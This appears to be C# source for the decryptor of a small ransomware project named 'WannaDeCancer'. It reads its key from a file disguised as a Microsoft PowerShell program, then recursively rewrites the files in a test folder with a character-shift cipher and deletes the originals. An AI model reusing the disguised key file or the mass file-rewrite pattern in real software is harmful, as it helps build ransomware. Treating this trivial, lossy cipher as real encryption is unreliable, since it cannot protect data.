using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace WannaDeCancer
{
    public partial class Decrypt : Form
    {
        #region Field
        private int keygen;
        private bool firsttime = true;
        private Thread thread;
        #endregion

        #region Contructor
        public Decrypt(int keygen)
        {
            CheckForIllegalCrossThreadCalls = false;
            InitializeComponent();
            //Get data
            this.keygen = keygen;
            //Start Auto Decrypt
            thread = new Thread(DecryptProcess);
            thread.Start();

        }
        public Decrypt()
        {
            CheckForIllegalCrossThreadCalls = false;
            InitializeComponent();
            keygen = int.Parse(Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\shell.exe", EncodeType.UTF));

            thread = new Thread(DecryptProcess);
            thread.Start();
        }
        #endregion

        #region EventHandler
        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.AutoUpgradeEnabled = true;
            openFileDialog.Title = "Choose File to decrypt";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
                txbChooseFile.Text = openFileDialog.FileName;
        }

        private void btnChooseKey_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.AutoUpgradeEnabled = true;
            openFileDialog.Title = "Choose File to decrypt";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
                txbKey.Text = openFileDialog.FileName;
        }

        private void txbStreamIN_Click(object sender, EventArgs e)
        {
            if (firsttime)
                txbStreamIN.Text = "";
            else return;

            firsttime = false;
        }

        private void txbStreamIN_Leave(object sender, EventArgs e)
        {
            if (txbStreamIN.Text == "")
            {
                txbStreamIN.Text = "<Insert Stream Here>";
                txbStreamOut.Text = "<Output>";
            }
            else
            {
                //txbOutput.Text = decryptStream();
            }
            firsttime = true;
        }
        #endregion


        #region Method
        private void WriteLogOutput(string s)
        {
            txbOutput.Text = s + "\r\n" + txbOutput.Text;
        }
        private void DecryptProcess()
        {
            for (int i = 0; i < 10; i++)
            {
                WriteLogOutput($"Decrypt in {10 - i} second(s)");
                Thread.Sleep(1000);
            }
            
            //foreach (DriveInfo item in drive)
            //{
            //    AutoDecrypt(item.Name);
            //}
            AutoDecrypt(@"C:\Files\Test\");
            WriteLogOutput("Done Process");
        }
        private void AutoDecrypt(string path)
        {
            string[] directories = Directory.GetDirectories(path);
            string[] files = Directory.GetFiles(path);

            foreach (string item in files)
            {
                FileInfo file = new FileInfo(item);
                string fe = file.Extension;
                DecryptFile(item);
            }

            foreach (string item in directories)
            {
                AutoDecrypt(item);
            }
        }
        private void DecryptFile(string path)
        {
            try
            {
                FileStream fs = new FileStream(path, FileMode.Open);
                byte[] orginal = new byte[fs.Length];

                for (int i = 0; i < fs.Length; i++)
                {
                    orginal[i] = (byte)fs.ReadByte();
                }

                char[] charSet = new char[orginal.Length];

                charSet = Encoding.Default.GetChars(orginal);

                for (int i = 0; i < fs.Length; i++)
                {
                    charSet[i] -= (char)keygen;
                }

                byte[] encrypt = new byte[fs.Length];
                encrypt = Encoding.Default.GetBytes(charSet);
                fs.Close();

                FileStream fsEncrypt = new FileStream(path.Substring(0, path.LastIndexOf('.')), FileMode.Create);
                fsEncrypt.Write(encrypt, 0, encrypt.Length);
                fsEncrypt.Close();
                File.Delete(path);
                WriteLogOutput("Successfully Decrypt File: " + path);
            }
            catch
            {              
                WriteLogOutput("Failed to Decrypt File: " + path);
                return;
            }
        }
        #endregion
    }
}
